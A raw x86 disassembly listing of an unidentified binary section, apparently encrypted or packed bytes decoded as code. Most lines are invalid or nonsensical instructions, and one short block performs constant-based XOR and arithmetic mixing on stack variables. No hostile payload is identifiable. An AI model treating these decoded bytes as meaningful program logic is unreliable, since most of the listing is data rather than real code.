  413e63:	addr16 xchg esp,eax
  413e65:	xor    DWORD PTR [edi+ebx*4],esi
  413e68:	call   0xacf09462
  413e6d:	mov    ds:0x1457e2f8,eax
  413e72:	shr    BYTE PTR [ecx+eiz*1+0x50],0xf3
  413e77:	dec    ebx
  413e78:	pop    ecx
  413e79:	inc    ebx
  413e7a:	enter  0xc9f,0x96
  413e7e:	daa    
  413e7f:	and    DWORD PTR [esi+0x47cb4879],ecx
  413e85:	shl    BYTE PTR gs:[esi+eax*2],1
  413e89:	les    esi,FWORD PTR [eax-0x68976da4]
  413e8f:	jbe    0x413e2a
  413e91:	das    
  413e92:	mov    WORD PTR [eax+0x1f70a6f],fs
  413e98:	cmp    DWORD PTR [ebp+edi*1+0x11a7d91e],0x30
  413ea0:	pushf  
  413ea1:	push   esp
  413ea2:	punpckldq mm7,DWORD PTR [eax+0x23]
  413ea6:	sar    bh,0x3b
  413ea9:	pop    ds
  413eaa:	mov    al,0x3a
  413eac:	inc    eax
  413ead:	pop    ebp
  413eae:	inc    edx
  413eaf:	sub    eax,0x3a6731be
  413eb4:	jno    0x413f30
  413eb6:	and    eax,0x766a85f8
  413ebb:	mov    dh,0xcd
  413ebd:	mov    cs,esi
  413ebf:	enter  0x1ac9,0xf8
  413ec3:	imul   edi,ebp,0xf
  413ec6:	icebp  
  413ec7:	xchg   ecx,eax
  413ec8:	dec    ecx
  413ec9:	(bad)  
  413eca:	jmp    0xe5efc15
  413ecf:	jae    0x413e59
  413ed1:	imul   esi,DWORD PTR [ebx],0xffffffb2
  413ed4:	pop    esp
  413ed5:	cmp    BYTE PTR [ebx+0x3a],bl
  413ed8:	repnz mov ah,0xde
  413edb:	imul   edi,eax,0xa3f0260a
  413ee1:	pop    ss
  413ee2:	jae    0x413f07
  413ee4:	sbb    al,0xaa
  413ee6:	xchg   BYTE PTR [edx+0x35],ch
  413ee9:	xlat   BYTE PTR ds:[ebx]
  413eea:	jae    0x413ee7
  413eec:	mov    al,ds:0x69a97922
  413ef1:	icebp  
  413ef2:	cdq    
  413ef3:	jb     0x413f0e
  413ef5:	cmp    BYTE PTR [ebx-0x4da92e76],ch
  413efb:	sub    edi,DWORD PTR [ecx]
  413efd:	xor    al,0xed
  413f00:	jmp    0x413f81
  413f02:	xchg   BYTE PTR [esi-0x3c],bl
  413f05:	fistp  QWORD PTR [edi+0x1d]
  413f08:	ins    DWORD PTR es:[edi],dx
  413f09:	retf   0x65b9
  413f0c:	mov    al,ds:0xbaeab558
  413f11:	fld    DWORD PTR [edx-0x16]
  413f14:	(bad)  
  413f15:	or     BYTE PTR [ebx+0x555a1819],dl
  413f1b:	jp     0x413f3c
  413f1d:	mov    edi,0xf3ec6429
  413f22:	cmp    cl,BYTE PTR [ecx-0x71f7c2f8]
  413f28:	cs push ecx
  413f2a:	mov    ds:0x63b9aed4,eax
  413f2f:	lock shl ebx,1
  413f32:	jecxz  0x413f2a
  413f34:	or     eax,0x1ce2ab1f
  413f39:	mov    es,esp
  413f3b:	sub    ebp,eax
  413f3d:	test   BYTE PTR [eax-0x11638309],bl
  413f43:	pop    es
  413f44:	lods   al,BYTE PTR ds:[esi]
  413f45:	fisub  WORD PTR [edx+0x73]
  413f48:	adc    al,0xf1
  413f4a:	or     BYTE PTR [edi+esi*8],ah
  413f4d:	in     al,0x37
  413f4f:	fidiv  WORD PTR [edx+0x2c]
  413f52:	shl    BYTE PTR [ebp+0x33],0xb8
  413f56:	(bad)  
  413f57:	and    eax,0xe525d14d
  413f5c:	inc    ebx
  413f5d:	(bad)  
  413f5e:	sti    
  413f5f:	xchg   esi,eax
  413f60:	xchg   ebp,eax
  413f61:	enter  0xaaa,0xba
  413f65:	push   cs
  413f66:	jb     0x413f77
  413f68:	nop
  413f69:	imul   ebx,ebp,0x58014748
  413f6f:	push   eax
  413f70:	ja     0x413f32
  413f72:	cmp    al,BYTE PTR [edi+esi*8-0x42aeca8a]
  413f79:	aam    0xaf
  413f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f7c:	outs   dx,DWORD PTR ds:[esi]
  413f7d:	stc    
  413f7e:	imul   ecx,DWORD PTR [eax+esi*1],0xffffffc9
  413f82:	loopne 0x413f56
  413f84:	add    BYTE PTR [ebp-0x9],0x30
  413f88:	xchg   esi,eax
  413f89:	adc    eax,0x3ac6619b
  413f8e:	jbe    0x413fd0
  413f90:	in     eax,dx
  413f91:	push   ebx
  413f92:	jno    0x413fc1
  413f94:	mov    dh,0xe
  413f96:	and    ch,BYTE PTR [ebx-0x3]
  413f99:	dec    ebx
  413f9a:	mov    edx,DWORD PTR [ebp+0x8]
  413f9d:	mov    ebx,DWORD PTR [ebp-0x8]
  413fa0:	xor    edx,eax
  413fa2:	xor    ebx,eax
  413fa4:	sub    edx,ebx
  413fa6:	sub    edx,esi
  413fa8:	xor    edx,eax
  413faa:	mov    DWORD PTR [ebp+0x8],edx
  413fad:	mov    edx,DWORD PTR [ebp+0x8]
  413fb0:	mov    ebx,DWORD PTR [ebp-0x58]
  413fb3:	add    edx,0x5708c4
  413fb9:	imul   edx,ebx
  413fbc:	mov    DWORD PTR [ebp-0x58],edx
  413fbf:	mov    edx,DWORD PTR [ebp+0x8]
  413fc2:	mov    ebx,DWORD PTR [ebp-0x54]
  413fc5:	add    edx,0x64f8da
  413fcb:	or     edx,ebx
  413fcd:	mov    DWORD PTR [ebp-0x54],edx
  413fd0:	mov    edx,DWORD PTR [ebp+0x8]
  413fd3:	mov    ebx,DWORD PTR [ebp-0x50]
  413fd6:	add    edx,ecx
  413fd8:	xor    edx,ebx
  413fda:	mov    DWORD PTR [ebp-0x50],edx
  413fdd:	mov    edx,DWORD PTR [ebp+0x8]
  413fe0:	mov    ebx,DWORD PTR [ebp-0x4c]
  413fe3:	add    edx,edi
  413fe5:	and    edx,ebx
  413fe7:	mov    DWORD PTR [ebp-0x4c],edx
  413fea:	mov    edx,DWORD PTR [ebp+0x8]
  413fed:	mov    ebx,DWORD PTR [ebp-0x48]
  413ff0:	lea    edx,[ebx+edx*1+0x241fc1f]
  413ff7:	mov    DWORD PTR [ebp-0x48],edx
  413ffa:	mov    edx,DWORD PTR [ebp+0x8]
  413ffd:	mov    ebx,0xfa5e15e2
  414002:	jmp    0x4163b6
  414007:	scas   eax,DWORD PTR es:[edi]
  414008:	shl    BYTE PTR [eax-0x7f],cl
  41400b:	jno    0x413f90
  41400d:	scas   eax,DWORD PTR es:[edi]
  41400e:	mov    dl,0xfb
  414010:	xor    DWORD PTR [edi-0x3e],edx
  414013:	jecxz  0x414040
  414015:	aad    0xc0
  414017:	mov    ds:0xeb7c7c74,al
  41401c:	pop    edi
  41401d:	jl     0x41409b
  41401f:	cmp    al,BYTE PTR [ebx+0x753a05fc]
  414025:	call   0x78e1:0xb35eda8d
  41402c:	stos   BYTE PTR es:[edi],al
  41402d:	push   edi
  41402e:	dec    edx
  41402f:	dec    esi
  414030:	int3   
  414031:	mov    ebx,0x65e78bed
  414036:	mov    gs,esi
  414038:	(bad)  
  41403a:	sub    cl,BYTE PTR [ebp-0x40ebae9d]
  414040:	mov    ecx,?
  414042:	ss call 0xa8766298
  414048:	or     eax,eax
  41404a:	inc    ebp
  41404b:	xchg   edi,edx
  41404d:	jne    0x414087
  41404f:	add    al,0x52
  414051:	daa    
  414052:	js     0x4140ad
  414054:	add    DWORD PTR [edx+0xdb740c1],edx
  41405a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41405b:	mov    ebp,0xbf0406c4
  414060:	sbb    al,0xc9
  414062:	push   esi
  414063:	push   ss
  414064:	adc    eax,DWORD PTR [ebx+0x71]
  414067:	cdq    
  414068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414069:	rol    BYTE PTR [eax],0xd5
  41406c:	ret    0x4dc6
  41406f:	push   es
  414070:	setp   BYTE PTR [eax]
  414073:	lods   al,BYTE PTR ds:[esi]
  414074:	into   
  414075:	int3   
  414076:	xchg   ebx,eax
  414077:	dec    ebx
  414078:	sub    bl,bh
  41407a:	cmp    al,0x5
  41407c:	jecxz  0x4140bf
  41407e:	idiv   dl
  414080:	mov    ecx,0x9eae68c8
  414085:	add    edi,ebx
  414087:	cmp    BYTE PTR [edi],bh
  414089:	leave  
  41408a:	sti    
  41408b:	(bad)  
  41408c:	push   edi
  41408d:	pop    edi
  41408e:	mov    dl,BYTE PTR [ebp+ebp*4-0x19]
  414092:	xor    BYTE PTR [ebx-0x35],bl
  414095:	sbb    DWORD PTR [edx+0x5560b326],edx
  41409b:	sbb    al,0x5d
  41409d:	aad    0x85
  41409f:	fs jecxz 0x4140c9
  4140a2:	jo     0x41402b
  4140a4:	push   esi
  4140a5:	cmp    BYTE PTR [esi+0x5695ed42],ah
  4140ab:	adc    ebp,DWORD PTR [ebp-0xc]
  4140ae:	into   
  4140af:	or     bh,BYTE PTR [ecx+esi*1]
  4140b2:	dec    ebp
  4140b3:	push   ds
  4140b4:	gs mov ebp,0xf2aec95e
  4140ba:	mov    edx,0x29a28301
  4140bf:	mov    bl,BYTE PTR [edi]
  4140c1:	fld    QWORD PTR [esi+0x7f]
  4140c4:	les    esp,FWORD PTR [ebx-0x14]
  4140c7:	jg     0x4140e6
  4140c9:	mov    WORD PTR [ebp-0x1359b8f0],es
  4140cf:	(bad)  
  4140d0:	ffree  st(2)
  4140d2:	mov    eax,0xdc62f60d
  4140d7:	pop    eax
  4140d8:	jb     0x4140e2
  4140da:	scas   al,BYTE PTR es:[edi]
  4140db:	test   ah,cl
  4140dd:	pop    esi
  4140de:	int3   
  4140df:	in     al,dx
  4140e0:	mov    al,ds:0x14563167
  4140e5:	loopne 0x4140b1
  4140e7:	retf   
  4140e8:	cmp    esi,DWORD PTR [eax]
  4140ea:	mov    WORD PTR [ecx+0x5f753faa],?
  4140f0:	xchg   ecx,eax
  4140f1:	and    al,0x73
  4140f3:	and    eax,0xbc6cf456
  4140f8:	sub    al,0x8b
  4140fa:	xor    BYTE PTR [ecx-0x744a3f8d],dh
  414100:	xchg   edx,eax
  414101:	add    al,0xb0
  414103:	stos   DWORD PTR es:[edi],eax
  414104:	pop    ss
  414105:	mov    ds:0x40faedfc,al
  41410a:	les    edx,FWORD PTR [ecx]
  41410c:	push   es
  41410d:	adc    DWORD PTR [ecx],eax
  41410f:	iret   
  414110:	sahf   
  414111:	sahf   
  414112:	sti    
  414113:	sub    al,0xb
  414115:	out    dx,eax
  414116:	or     esi,ebx
  414118:	js     0x4140c7
  41411a:	sbb    dh,bh
  41411c:	rcr    BYTE PTR [ebx+0x35a94239],0x81
  414123:	adc    dh,BYTE PTR [ecx-0x21]
  414126:	arpl   WORD PTR [ebx],cx
  414128:	(bad)  
  414129:	(bad)  
  41412b:	cmp    DWORD PTR [edi-0x70],ebx
  41412e:	inc    ebx
  41412f:	push   esp
  414130:	and    al,0xeb
  414132:	ret    0xdb6c
  414135:	add    DWORD PTR [edi-0x37],0xffffffba
  414139:	scas   eax,DWORD PTR es:[edi]
  41413a:	add    ecx,DWORD PTR [edi]
  41413c:	xlat   BYTE PTR ds:[ebx]
  41413d:	mov    DWORD PTR ds:0xf954b79e,edi
  414143:	cld    
  414144:	jb     0x41413d
  414146:	mov    ch,0xb2
  414148:	push   eax
  414149:	lea    ecx,[ebx]
  41414b:	lea    ebp,[edi+ecx*2-0x2d]
  41414f:	stos   BYTE PTR es:[edi],al
  414150:	mov    eax,0x537cffab
  414155:	outs   dx,BYTE PTR ds:[esi]
  414156:	psadbw mm3,QWORD PTR ds:0xc37add51
  41415d:	pop    ebp
  41415e:	jno    0x4141b7
  414160:	jb     0x4141d6
  414162:	inc    edx
  414163:	mov    BYTE PTR [edi+0x4382198f],bl
  414169:	mov    ebx,0xf95417a4
  41416e:	and    al,0x40
  414170:	push   es
  414171:	lea    edx,[di]
  414174:	add    BYTE PTR [eax],ch
  414176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414177:	pop    esp
  414178:	icebp  
  414179:	sub    DWORD PTR [eax+0x7f69c9dc],edi
  41417f:	push   esi
  414180:	call   0x45d39f83
  414185:	dec    ebx
  414186:	jbe    0x41419d
  414188:	das    
  414189:	call   0x89ecddd6
  41418e:	cs sub eax,0x24dc5925
  414194:	mov    edi,0xbc78aae9
  414199:	sub    bh,al
  41419b:	sbb    ebx,0x3f
  41419e:	xchg   ebx,eax
  41419f:	mov    ecx,0xb11ecf3c
  4141a4:	jb     0x414126
  4141a6:	xchg   edx,eax
  4141a7:	inc    edi
  4141a8:	pop    es
  4141a9:	jb     0x414134
  4141ab:	dec    edi
  4141ac:	sbb    ch,ah
  4141ae:	iret   
  4141af:	add    ecx,ebp
  4141b1:	mov    ebx,0x2e764371
  4141b6:	popa   
  4141b7:	js     0x414214
  4141b9:	push   ds
  4141ba:	test   BYTE PTR [ebx+0x7eda8caa],bh
  4141c0:	xchg   edi,eax
  4141c1:	mov    cs:0xe4a06c5b,eax
  4141c7:	or     bl,BYTE PTR [ebx]
  4141c9:	out    0xb5,al
  4141cb:	add    eax,0x1462e550
  4141d0:	push   edi
  4141d1:	cs inc esi
  4141d3:	shl    BYTE PTR [esi],0xbb
  4141d6:	cwde   
  4141d7:	test   eax,0xb065d0ca
  4141dc:	or     ebp,edx
  4141de:	adc    dh,BYTE PTR [ebx+0x757b049c]
  4141e4:	addr16 (bad) 
  4141e6:	iret   
  4141e7:	sub    DWORD PTR [ebx-0x235a7c1b],0x7d7b6d92
  4141f1:	mov    eax,0xa70d776a
  4141f6:	push   0x4c
  4141f8:	rol    dl,0xfa
  4141fb:	fiadd  DWORD PTR [edx-0xa]
  4141fe:	ret    
  4141ff:	ror    DWORD PTR [eax],cl
  414201:	(bad)  
  414202:	int    0xf2
  414204:	ds popa 
  414206:	arpl   WORD PTR [ebp+edi*1+0x44],si
  41420a:	sub    eax,0x21b384d3
  41420f:	push   edi
  414210:	(bad)  
  414211:	sub    cl,BYTE PTR [ebp+0x1e]
  414214:	dec    ebx
  414215:	xchg   edi,eax
  414216:	scas   eax,DWORD PTR es:[edi]
  414217:	and    eax,DWORD PTR [ecx*8-0x5c5349c8]
  41421e:	sub    eax,0x55d5b32b
  414223:	aad    0xd3
  414225:	ss scas al,BYTE PTR es:[edi]
  414227:	mov    ecx,ebp
  414229:	cmp    eax,0x91231f89
  41422e:	cli    
  41422f:	or     BYTE PTR [ecx+edx*8],ch
  414232:	hlt    
  414233:	fcmovb st,st(4)
  414235:	sub    ecx,DWORD PTR [edx-0x43]
  414238:	mov    ecx,0x3ee84334
  41423d:	lds    esi,FWORD PTR [edi+0x38]
  414240:	fisub  WORD PTR [esi-0x5e]
  414243:	popa   
  414244:	in     eax,dx
  414245:	pop    edx
  414246:	mov    eax,0x78808dcc
  41424b:	out    0xc1,eax
  41424d:	mov    eax,ds:0x55ad085f
  414252:	pop    esi
  414253:	and    edi,0x987bb84d
  414259:	int    0x72
  41425b:	cmp    DWORD PTR ds:0x7ca813c6,ebp
  414261:	sub    bl,BYTE PTR [ebx-0x1]
  414264:	retf   
  414265:	outs   dx,DWORD PTR ds:[esi]
  414266:	rcl    BYTE PTR [eax*8-0x717d56c3],1
  41426d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41426e:	mov    esp,0x80c6630
  414273:	inc    ebx
  414274:	scas   eax,DWORD PTR es:[edi]
  414275:	stos   BYTE PTR es:[edi],al
  414276:	clc    
  414277:	xor    dh,BYTE PTR [eax-0x11a454ad]
  41427d:	mov    cl,0x80
  41427f:	popf   
  414280:	mov    DWORD PTR ds:0x217e58d9,esi
  414286:	jmp    0x7507a477
  41428b:	sbb    dh,bh
  41428d:	mov    ebp,0x8ae9fda9
  414292:	lds    ebx,FWORD PTR [edi-0x2b]
  414295:	repz jae 0x4142d8
  414298:	push   ds
  414299:	xchg   edx,eax
  41429a:	clc    
  41429b:	imul   edx,DWORD PTR [edx-0x26],0x10f61ae7
  4142a2:	push   ecx
  4142a3:	fld    st(2)
  4142a5:	inc    edx
  4142a6:	dec    BYTE PTR [ecx]
  4142a8:	inc    ecx
  4142a9:	sbb    eax,0x35eeea63
  4142ae:	je     0x41432e
  4142b0:	push   esp
  4142b1:	xor    eax,edx
  4142b3:	outs   dx,BYTE PTR ds:[esi]
  4142b4:	shl    al,1
  4142b6:	add    BYTE PTR [ebx+0x3],0xe0
  4142ba:	(bad)  
  4142bb:	loopne 0x414321
  4142bd:	out    dx,eax
  4142be:	scas   eax,DWORD PTR es:[edi]
  4142bf:	outs   dx,BYTE PTR ds:[esi]
  4142c0:	or     eax,0x9adabb43
  4142c5:	idiv   dh
  4142c7:	adc    DWORD PTR [esi],0x1a2591ca
  4142cd:	push   cs
  4142ce:	mov    ds:0x168a7bf8,al
  4142d3:	jmp    0x1bce22d7
  4142d8:	and    dl,BYTE PTR [eax-0x66]
  4142db:	je     0x414357
  4142dd:	ret    0xbfe7
  4142e0:	ficomp DWORD PTR [edx+0x6278320d]
  4142e6:	aam    0x23
  4142e8:	jge    0x4142de
  4142ea:	fist   WORD PTR [ecx-0x57238dc2]
  4142f0:	jnp    0x4142ee
  4142f2:	jg     0x414282
  4142f4:	push   eax
  4142f5:	jecxz  0x414319
  4142f7:	push   cs
  4142f8:	sbb    eax,0x511d7aa6
  4142fd:	adc    BYTE PTR [eax-0x12],bl
  414300:	loope  0x414333
  414302:	ins    BYTE PTR es:[edi],dx
  414303:	(bad)  
  414304:	in     eax,0x86
  414306:	add    DWORD PTR [eax+0x1f],esp
  414309:	sti    
  41430a:	jo     0x4142bf
  41430c:	add    bl,BYTE PTR [esi+eax*8-0x7f]
  414310:	xor    ebp,DWORD PTR [eax-0x40]
  414313:	ds mov cl,0x3a
  414316:	cwde   
  414317:	inc    ecx
  414318:	fwait
  414319:	mov    ebp,0xb72e1770
  41431e:	mov    eax,0x58fb5d7b
  414323:	pop    ebp
  414324:	sbb    ecx,ebp
  414326:	xor    edx,edi
  414328:	sti    
  414329:	cmp    al,0xa0
  41432b:	jg     0x414323
  41432d:	fdiv   DWORD PTR [ebx+0x3]
  414330:	into   
  414331:	cmp    edx,DWORD PTR [esi-0x668d005a]
  414337:	jge    0x4142c8
  414339:	mov    bh,0x50
  41433b:	jae    0x414318
  41433d:	xor    ebx,DWORD PTR [esi]
  41433f:	mov    ch,0x97
  414341:	mov    al,ds:0x59facfa9
  414346:	cmp    bh,cl
  414348:	mov    ecx,0xa70dfd4e
  41434d:	mov    cl,0x84
  41434f:	das    
  414350:	loope  0x414391
  414352:	push   es
  414353:	cmp    dh,BYTE PTR ds:0x53a1ebca
  414359:	pop    ss
  41435a:	dec    edx
  41435b:	mov    edi,0x6d52cd1e
  414360:	push   esi
  414361:	mov    ebp,0x6061d5b1
  414366:	out    0x5a,al
  414368:	ror    edi,cl
  41436a:	mov    bh,0xbc
  41436c:	push   cs
  41436d:	or     bh,BYTE PTR [esi+edi*1]
  414370:	fidivr WORD PTR [ebp-0x3d]
  414373:	sub    ebx,DWORD PTR [ecx-0x3fc175fc]
  414379:	iret   
  41437a:	dec    ecx
  41437b:	(bad)  
  41437c:	out    0x16,eax
  41437e:	ds push ss
  414380:	pop    edi
  414381:	(bad)  
  414383:	test   BYTE PTR [eax+0x487e2a11],0x65
  41438a:	push   ebp
  41438b:	mov    al,ds:0x58b34410
  414390:	and    al,0x38
  414392:	pop    ebx
  414393:	mov    ecx,0xfcea6933
  414398:	push   ebp
  414399:	fwait
  41439a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41439b:	sub    eax,DWORD PTR [ebx-0xd]
  41439e:	bswap  edi
  4143a0:	xchg   bl,cl
  4143a2:	pop    edx
  4143a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143a4:	pop    edx
  4143a5:	das    
  4143a6:	scas   eax,DWORD PTR es:[edi]
  4143a7:	loope  0x414342
  4143a9:	jmp    0xf781f62a
  4143ae:	clc    
  4143af:	(bad)  
  4143b0:	pop    ebx
  4143b1:	cmp    edx,ebp
  4143b3:	inc    edi
  4143b4:	ror    DWORD PTR [edi],1
  4143b6:	xchg   edx,eax
  4143b7:	jl     0x4143e9
  4143b9:	cmp    DWORD PTR fs:[edi+eax*4-0x4b668214],0x151f478d
  4143c5:	(bad)  
  4143c6:	in     eax,0x12
  4143c8:	or     BYTE PTR [ebx-0x7f5560f4],bl
  4143ce:	les    eax,FWORD PTR [ecx]
  4143d0:	push   edi
  4143d1:	cmp    al,0xb7
  4143d3:	(bad)  
  4143d4:	mov    edi,0xbd43d1a4
  4143d9:	sub    BYTE PTR [eax],bh
  4143db:	(bad)  
  4143dd:	sub    al,BYTE PTR [edx+ebx*8-0x5cfdf525]
  4143e4:	in     eax,0x6f
  4143e6:	mov    ds:0x167f6df3,al
  4143eb:	cmp    DWORD PTR [eax+0x2eadda16],0xd5dae70d
  4143f5:	dec    ebx
  4143f6:	jecxz  0x4143fb
  4143f8:	or     DWORD PTR [edx+0x6f],ecx
  4143fb:	test   al,0xf2
  4143fd:	out    0xfd,al
  4143ff:	dec    ebp
  414400:	out    dx,al
  414401:	sub    edi,DWORD PTR [ebp-0x7f]
  414404:	xor    eax,0x190fd9e
  414409:	cld    
  41440a:	jne    0x4143b6
  41440c:	aam    0xac
  41440e:	jmp    0x4143ef
  414410:	sub    BYTE PTR [ebx+0x29],dh
  414413:	push   ebx
  414414:	pop    ebp
  414415:	and    DWORD PTR [edi-0x5d7892dc],edx
  41441b:	rcr    DWORD PTR [edx],cl
  41441d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41441e:	mul    dl
  414420:	mov    ebx,0xdc543b44
  414425:	pop    edi
  414426:	iret   
  414427:	fidiv  WORD PTR [edx]
  414429:	popa   
  41442a:	arpl   WORD PTR [eax],bx
  41442c:	mov    esi,0x1ba7c282
  414431:	aaa    
  414432:	mov    eax,ds:0x5f41a0b
  414437:	in     eax,0xf7
  414439:	int3   
  41443a:	xchg   ebp,eax
  41443b:	clc    
  41443c:	fdivr  st,st(1)
  41443e:	or     eax,0x746499dd
  414443:	rcr    BYTE PTR [edi],0x82
  414446:	xchg   edi,eax
  414447:	xor    esi,DWORD PTR [esi+0x3e]
  41444a:	(bad)  
  41444b:	sbb    DWORD PTR [ebx],edi
  41444d:	js     0x4143e0
  41444f:	xchg   esp,eax
  414450:	in     eax,dx
  414451:	lock add al,0x1e
  414454:	jmp    0x1826:0xcdbeaeaa
  41445b:	loope  0x4144a9
  41445d:	xor    DWORD PTR [ecx-0x17546aab],0xc9cc0749
  414467:	sti    
  414468:	mov    esi,0xc4170e2f
  41446d:	adc    BYTE PTR [edx],dl
  41446f:	mov    ah,al
  414471:	vpsubb ymm6,ymm2,YMMWORD PTR [ecx]
  414475:	pop    ebp
  414476:	push   esp
  414477:	or     ecx,ebx
  414479:	sub    bh,bl
  41447b:	popf   
  41447c:	push   esi
  41447d:	fiadd  WORD PTR [esi]
  41447f:	in     eax,0xe6
  414481:	add    esi,ebx
  414483:	push   0x59
  414485:	pop    es
  414486:	dec    esp
  414487:	xchg   dh,cl
  414489:	sub    al,0x4b
  41448b:	xchg   esi,eax
  41448c:	stos   BYTE PTR es:[edi],al
  41448d:	popf   
  41448e:	inc    eax
  41448f:	push   ebp
  414490:	ss pop ebp
  414492:	das    
  414493:	push   cs
  414494:	cmp    al,0x68
  414496:	cdq    
  414497:	mov    ah,dl
  414499:	or     ebx,DWORD PTR ds:0x5100fb01
  41449f:	cmp    dl,BYTE PTR [esi+0x4b]
  4144a2:	arpl   sp,sp
  4144a4:	jns    0x414457
  4144a6:	retf   0xea9e
  4144a9:	lock das 
  4144ab:	and    eax,0xa7456748
  4144b0:	push   edi
  4144b1:	scas   eax,DWORD PTR es:[edi]
  4144b2:	mov    BYTE PTR [ecx+ebp*2],0x81
  4144b6:	call   0x8906f210
  4144bb:	clc    
  4144bc:	rcr    al,1
  4144be:	mov    ebx,0x4f9ed114
  4144c3:	xchg   edi,eax
  4144c4:	dec    eax
  4144c5:	push   edi
  4144c6:	xchg   edi,eax
  4144c7:	out    dx,eax
  4144c8:	(bad)  
  4144ca:	fsub   QWORD PTR ds:0xdc75876a
  4144d0:	(bad)  
  4144d1:	in     al,0xee
  4144d3:	mov    ecx,0xe03be535
  4144d8:	aaa    
  4144d9:	and    eax,0x396df342
  4144de:	imul   BYTE PTR gs:[ecx+0x6]
  4144e2:	dec    ebp
  4144e3:	fidiv  DWORD PTR [esi-0x71bf0ea5]
  4144e9:	dec    ecx
  4144ea:	pop    esp
  4144eb:	jbe    0x414472
  4144ed:	ficomp WORD PTR [ebx+0x30]
  4144f0:	cmp    DWORD PTR [ecx+0x7ff09d0a],ecx
  4144f6:	xor    DWORD PTR [edx],eax
  4144f8:	xchg   esi,eax
  4144f9:	dec    ebx
  4144fa:	adc    al,0xce
  4144fc:	(bad)  
  4144fe:	lahf   
  4144ff:	and    al,BYTE PTR [esi-0x2236f3b0]
  414505:	and    DWORD PTR [ebp-0x4e438389],ebp
  41450b:	sbb    al,0x37
  41450d:	cmp    al,0x10
  41450f:	push   ebp
  414510:	sbb    dl,BYTE PTR [ebx+0x1b]
  414513:	sbb    al,0x48
  414515:	test   al,0x1a
  414517:	fimul  DWORD PTR [esi-0x3d]
  41451a:	in     eax,0xd7
  41451c:	loopne 0x414570
  41451e:	mov    ecx,0xd86e37ef
  414523:	retf   0xb5ae
  414526:	out    dx,eax
  414527:	xor    eax,eax
  414529:	dec    ecx
  41452a:	add    eax,0x9b80c6a8
  41452f:	pusha  
  414530:	xchg   edx,eax
  414531:	fwait
  414532:	out    dx,eax
  414533:	sub    eax,0x8e8286ec
  414538:	pop    ecx
  414539:	or     dh,BYTE PTR [ecx+ebp*4-0x58d9ee36]
  414540:	jl     0x4144d2
  414542:	mov    al,0xc7
  414544:	pusha  
  414545:	iret   
  414546:	adc    BYTE PTR [ebp+0xe],ah
  414549:	jg     0x414522
  41454b:	pop    esp
  41454c:	mov    eax,ds:0xb47bbd48
  414551:	mov    ds:0x83275e1c,eax
  414556:	dec    esi
  414557:	sub    eax,0x72bfe22
  41455c:	mov    cl,0xf7
  41455e:	jno    0x414537
  414560:	mov    ebp,eax
  414562:	fstp   TBYTE PTR [ebp+0x2274b8f6]
  414568:	(bad)  [esi]
  41456a:	cmp    BYTE PTR [edx-0x3f],dl
  41456d:	ss jnp 0x414514
  414570:	in     al,dx
  414571:	punpckhdq mm4,mm6
  414574:	jg     0x414567
  414576:	or     al,0xf8
  414578:	fld    QWORD PTR [esp+edi*2+0x74]
  41457c:	cmp    BYTE PTR [ecx],ah
  41457e:	xchg   BYTE PTR [edx-0x19],ah
  414581:	mov    edi,0x71c5f102
  414586:	(bad)  
  414587:	retf   
  414588:	mov    ch,0xfd
  41458a:	leave  
  41458b:	f2xm1  
  41458d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41458e:	mov    bh,0x3a
  414590:	and    cl,BYTE PTR [ecx]
  414592:	hlt    
  414593:	pop    ss
  414594:	sbb    eax,0x9ab9416c
  414599:	fstp   DWORD PTR [ebx]
  41459b:	inc    eax
  41459c:	xor    BYTE PTR [edx+0x154d1570],0x7e
  4145a3:	fistp  WORD PTR [edx]
  4145a5:	lods   eax,DWORD PTR ds:[esi]
  4145a6:	test   DWORD PTR [esi],ebx
  4145a8:	into   
  4145a9:	lods   al,BYTE PTR ds:[esi]
  4145aa:	ret    
  4145ab:	(bad)  [esi+ecx*2+0x13c536a5]
  4145b2:	mov    dh,BYTE PTR [ebx+0x19801243]
  4145b8:	retf   0xf0b1
  4145bb:	loop   0x414629
  4145bd:	fidiv  DWORD PTR [eax+0x72563044]
  4145c3:	mov    edi,0x1492ae9c
  4145c8:	jecxz  0x4145cb
  4145ca:	jb     0x41461b
  4145cc:	(bad)  
  4145cd:	fdiv   st,st(1)
  4145cf:	pusha  
  4145d0:	fwait
  4145d1:	mov    ebp,0x234d84a
  4145d6:	push   ebx
  4145d7:	sub    eax,0xd4228c54
  4145dc:	les    edi,FWORD PTR [ecx-0x26]
  4145df:	pop    edx
  4145e0:	repz pop edi
  4145e2:	push   0xffffff94
  4145e4:	mov    bl,0x6e
  4145e6:	iret   
  4145e7:	and    esp,DWORD PTR [edx+0x35]
  4145ea:	adc    eax,0xa3420458
  4145ef:	and    BYTE PTR [eax],al
  4145f1:	jnp    0x4145f1
  4145f3:	or     edx,edx
  4145f5:	xchg   BYTE PTR [ebp+0x4a],bh
  4145f8:	gs call 0x9c5a2911
  4145fe:	(bad)  
  4145ff:	comiss xmm4,DWORD PTR [esi-0x61]
  414603:	xor    DWORD PTR [ebx+0x59],eax
  414606:	test   eax,0xabedb1a0
  41460b:	loope  0x41459a
  41460d:	shr    edx,0xd5
  414610:	push   ebx
  414611:	neg    DWORD PTR [eax-0x2e835029]
  414617:	data16 stos BYTE PTR es:[edi],al
  414619:	nop
  41461a:	or     dl,bh
  41461c:	pop    ecx
  41461d:	fs pop es
  41461f:	sbb    DWORD PTR [edi+0x5a],edx
  414622:	dec    eax
  414623:	shl    WORD PTR [ecx+0x4a6d852d],1
  41462a:	cmp    eax,DWORD PTR [edx+0x64]
  41462d:	pop    esp
  41462e:	and    al,0x5
  414630:	js     0x41465f
  414632:	out    0xba,eax
  414634:	jno    0x4145d2
  414636:	hlt    
  414637:	cmp    DWORD PTR [edi-0x37],ecx
  41463a:	mov    WORD PTR [esi],es
  41463c:	adc    BYTE PTR [ebx],ah
  41463e:	frstor [ecx]
  414640:	mov    al,0x5b
  414642:	mov    ebx,0xfd6042ad
  414647:	fldenv [ebx+0x18bb53d7]
  41464d:	fidiv  WORD PTR [edx+0x5f3ef2fc]
  414653:	rcl    DWORD PTR [esi+0x4d],0xc0
